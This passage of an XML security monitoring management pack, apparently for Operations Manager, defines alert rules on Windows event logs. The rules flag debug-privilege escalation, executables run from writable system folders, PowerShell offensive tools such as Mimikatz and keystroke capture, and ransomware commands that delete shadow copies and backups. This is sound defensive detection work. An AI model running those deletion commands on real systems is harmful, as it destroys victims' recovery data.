                      <Value Type="UnsignedInteger">4648</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetbiosComputerName$</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[10]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>RPCSS</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[12]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>svchost.exe</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.Event.WMIRemote.Source.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/Params/Param[9]$</AlertParameter2>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.DebugEscalation" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4703</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">SeDebugPrivilege</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>NotEqual</Operator>
                    <ValueExpression>
                      <Value Type="String">C:\Windows\System32\wbem\WmiPrvSE.exe</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.DebugEscalation.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.ExecutableRunFromUserWriteableDirectory" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>.exe</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>Windows\debug\WIA</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\PCHEALTH\ERRORREP\QHEADLES</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\Registration\CRMLog</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>Windows\System32\Com\dmp</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\System32\Microsoft\Crypto\RSA\MachineKeys</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\System32\spool\drivers\color</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\System32\spool\PRINTERS</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\System32\spool\SERVERS</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\System32\Tasks</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\System32\Tasks\Microsoft\Windows\PLA\System</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\System32\Tasks\Microsoft\Windows\RemoteApp and Desktop Connections Update</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\SysWOW64\Com\dmp</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\SysWOW64\Tasks</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\SysWOW64\Tasks\Microsoft\Windows\RemoteApp and Desktop Connections Update</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\Tasks</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\Temp</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>\Windows\tracing</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.ExecutableRunFromUserWriteableDirectory.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.FindAVSignature" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Find-AVSignature</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.FindAVSignature.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/EventDescription$</AlertParameter1>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.4688.GenericCryptoRansomWare" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>vssadmin delete shadows /all /quiet</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>wmic shadowcopy delete</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <And>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>bcdedit /set {default} bootstatuspolicy ignoreallfailures</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>bcdedit /set {default} recoveryenabled no</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>wbadmin delete catalog -quiet</Pattern>
                          </RegExExpression>
                        </Expression>
                      </And>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.4688.GenericCryptoRansomWare.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.GetDLLLoadPath" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Get-DllLoadPath</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.GetDLLLoadPath.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.GetHTTPStatus" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Get-HttpStatus</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.GetHTTPStatus.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.GetKeystroke" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Get-Keystrokes</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.GetKeystroke.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.PowerShellLog.InvokeDLLInjection" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Windows PowerShell</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery>EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Invoke-DllInjection</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.PowerShellLog.InvokeDLLInjection.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.InvokeMimikatz" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value>800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>mimikatz</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.InvokeMimikatz.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.InvokeNinjaCopy" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">800</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">EventDescription</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Invoke-NinjaCopy</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertMessageId>$MPElement[Name="Security.Monitoring.ForwardedEvents.InvokeNinjaCopy.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="Security.Monitoring.ForwardedEvents.InvokePortScan" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="false" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
